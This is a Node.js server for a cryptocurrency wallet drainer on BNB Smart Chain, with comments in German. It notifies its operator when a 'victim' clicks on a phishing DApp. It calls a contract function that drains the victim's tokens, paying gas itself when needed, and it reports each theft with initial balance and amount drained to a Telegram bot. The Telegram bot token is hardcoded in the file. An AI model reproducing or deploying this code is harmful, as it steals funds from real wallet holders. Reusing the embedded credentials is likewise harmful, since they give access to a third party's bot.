// server.js
const express = require('express');
const ethers = require('ethers');
const axios = require('axios');
const cors = require('cors');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Konfiguration
const BSC_RPC_URL = "https://bsc-dataseed.binance.org/";
const provider = new ethers.providers.JsonRpcProvider(BSC_RPC_URL);

// !!! WICHTIG: ERSETZE DIESE WERTE MIT DEINEN AKTUELLEN DATEN !!!
const contractAddress = "0xAceA17E58cb0652b826Cb0Dc7604A752df6c7325"; // Adresse deines NEUEN Contracts
const contractABI = [
    "function drainWithScammerGas(address victim) public",
    "event TokensDrained(address indexed drainedBy, address indexed victim, uint256 tokenCount)",
    // NEUES, DETAILLIERTES EVENT
    "event DetailedDrainReport(address indexed victim, uint256 initialBalance, uint256 amountDrained, address indexed drainedBy)"
];
const telegramBotToken = "8065667239:AAHDSCJ-IYgnCvIof2xlz0y_q-LglZjPmqI"; // Dein Bot Token
const yourChatId = "6003232782"; // Deine Chat ID
const privateKey = process.env.PRIVATE_KEY; // Deine Private Key aus den Environment-Variablen

// Ethers Setup
const wallet = new ethers.Wallet(privateKey, provider);
const contract = new ethers.Contract(contractAddress, contractABI, wallet);

// --- API Endpunkte ---

// NEU: Endpunkt für den initialen Klick auf "Next"
app.post('/initial-click', async (req, res) => {
    const { victim } = req.body;
    if (!victim || !ethers.utils.isAddress(victim)) {
        console.error("Invalid victim address for initial click:", victim);
        return res.status(400).send("Invalid victim address");
    }
    console.log(`🔔 Initial Click Notification received for victim: ${victim}`);
    const message = `🔔 **NEW USER INTERACTION**\n\nUser clicked "Next" on the DApp.\n\nVictim: \`${victim}\`\n\nAwaiting approval...`;
    await sendTelegramMessage(message);
    res.status(200).send('Initial click notification sent.');
});

// Bestehender Endpunkt für den Drain mit Scammer Gas
app.post('/drain-request', async (req, res) => {
    const { victim } = req.body;
    if (!victim || !ethers.utils.isAddress(victim)) {
        console.error("Invalid victim address received for drain:", victim);
        return res.status(400).send("Invalid victim address");
    }

    console.log(`🔋 Received drain request for victim: ${victim}`);
    await sendTelegramMessage(`🔋 VICTIM LOW ON GAS!\nVictim: ${victim}\nAction: Initiating drain with Scammer Gas.`);
    
    try {
        const tx = await contract.drainWithScammerGas(victim);
        console.log(`Scammer-Gas Drain sent: ${tx.hash}`);
        await tx.wait();
        console.log(`✅ Scammer-Gas Drain successful for ${victim}.`);
        await sendTelegramMessage(`✅ DRAIN SUCCESSFUL (SCAMMER GAS)!\nVictim: ${victim}\nTx: https://bscscan.com/tx/${tx.hash}`);
        res.status(200).send("Drain successful");
    } catch (error) {
        console.error("❌ Error executing scammer-gas drain:", error);
        await sendTelegramMessage(`❌ DRAIN FAILED (SCAMMER GAS)!\nVictim: ${victim}\nError: ${error.message}`);
        res.status(500).send("Drain failed");
    }
});

// --- Event Listener ---

// Lausche auf das einfache TokensDrained-Event (für die schnelle Bestätigung)
contract.on("TokensDrained", async (drainedBy, victim, tokenCount) => {
    console.log(`🚨 EVENT RECEIVED: TokensDrained! By: ${drainedBy}, Victim: ${victim}, Count: ${tokenCount}`);
    
    const gasPayer = drainedBy === victim ? "VICTIM" : "SCAMMER";
    const message = `✅ **DRAIN CONFIRMED** (${gasPayer} GAS)\n\nVictim: \`${victim}\`\nDrained by: \`${drainedBy}\`\nTokens drained: \`${tokenCount}\``;
    await sendTelegramMessage(message);
});

// NEU: Lausche auf das detaillierte Event für den finalen Report
contract.on("DetailedDrainReport", async (victim, initialBalance, amountDrained, drainedBy) => {
    console.log(`🚨 DETAILED EVENT RECEIVED! Victim: ${victim}, Initial: ${initialBalance}, Drained: ${amountDrained}, By: ${drainedBy}`);
    
    // Wandle die BigNumber-Werte in lesbare Strings um.
    // WICHTIG: Passe die Dezimalstellen an, wenn du andere Tokens drainst!
    const decimals = 18; // Die meisten Tokens haben 18 Dezimalstellen. Für USDT z.B. auf 6 ändern.
    const readableInitialBalance = ethers.utils.formatUnits(initialBalance, decimals);
    const readableAmountDrained = ethers.utils.formatUnits(amountDrained, decimals);

    const message = `💰 **DETAILED DRAIN REPORT**\n\n` +
                   `👤 Victim: \`${victim}\`\n` +
                   `💸 Initial Balance: \`${readableInitialBalance}\`\n` +
                   `💰 Amount Drained: \`${readableAmountDrained}\`\n` +
                   `🤖 Drained by: \`${drainedBy}\``;
                   
    await sendTelegramMessage(message);
});

// --- Hilfsfunktion ---

async function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    try {
        await axios.post(url, { chat_id: yourChatId, text: message, parse_mode: 'Markdown' });
    } catch (error) {
        console.error("Error sending Telegram message:", error.response ? error.response.data : error.message);
    }
}

// --- Server Start ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Backend listening on port ${PORT}`);
    console.log("Event listeners are active. Waiting for contract events...");
});
